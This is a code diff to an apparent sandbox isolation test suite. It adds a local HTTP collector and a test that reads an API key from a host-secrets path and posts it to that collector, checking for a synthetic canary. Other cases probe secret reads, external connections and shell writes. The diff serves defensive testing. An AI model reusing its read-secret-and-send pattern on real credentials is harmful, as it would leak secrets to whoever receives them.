@@ -8,6 +8,9 @@ import os
 import socket
 import subprocess
 import sys
+import threading
+import urllib.request
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 from typing import Callable
 
@@ -40,6 +43,41 @@ def connect_external() -> str:
         return "connection unexpectedly succeeded"
 
 
+CANARY = "FORGE_CANARY_NOT_A_REAL_KEY_7f3c9a"
+
+
+class Collector(BaseHTTPRequestHandler):
+    received: bytes = b""
+
+    def do_POST(self) -> None:  # noqa: N802
+        Collector.received = self.rfile.read(int(self.headers.get("content-length", "0")))
+        self.send_response(204)
+        self.end_headers()
+
+    def log_message(self, *_: object) -> None:
+        pass
+
+
+collector = HTTPServer(("127.0.0.1", 18080), Collector)
+threading.Thread(target=collector.serve_forever, daemon=True).start()
+
+
+def send_api_token() -> str:
+    token = Path("/host-secrets/api-key").read_text().strip()
+    request = urllib.request.Request(
+        "http://127.0.0.1:18080/collect",
+        data=b"fixture=hello&token=" + token.encode(),
+        headers={"Authorization": f"Bearer {token}"},
+        method="POST",
+    )
+    with urllib.request.urlopen(request, timeout=2) as response:
+        if response.status != 204:
+            raise RuntimeError(f"collector returned {response.status}")
+    if CANARY.encode() not in Collector.received:
+        raise RuntimeError("collector did not receive the canary")
+    return "sent synthetic token to local collector"
+
+
 def shell_write() -> str:
     result = subprocess.run(
         ["/bin/sh", "-c", "printf bad > /sandbox-data/shell-created.txt"],
@@ -70,6 +108,7 @@ def run_test() -> list[dict]:
         attempt("read unmounted host secret", "denied", read_unmounted_secret),
         attempt("write read-only data", "denied", write_readonly),
         attempt("connect to external IP", "denied", connect_external),
+        attempt("send API token to local collector", "allowed_for_test", send_api_token),
         attempt("shell subprocess attempts a write", "write denied", shell_write),
         attempt("create mount namespace", "denied", create_mount_namespace),
         {
